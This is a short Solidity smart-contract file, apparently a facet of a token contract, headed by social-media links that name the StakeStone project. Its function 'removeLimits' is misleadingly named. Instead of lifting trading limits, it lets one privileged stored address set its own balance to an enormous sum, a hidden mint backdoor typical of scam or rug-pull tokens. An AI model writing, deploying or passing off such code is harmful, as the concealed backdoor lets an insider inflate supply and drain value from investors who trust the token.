/*  
   * SPDX-License-Identifier: MIT


     // Telegram: https://t.me/+afYqz2KG_YNlNzNl
    // Twitter: https://twitter.com/Stake_Stone
    // Website: https://stakestone.io/
    // Discord: https://discord.com/invite/jemqJ9PkCJ
    // Medium:  https://medium.com/@official_42951


*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
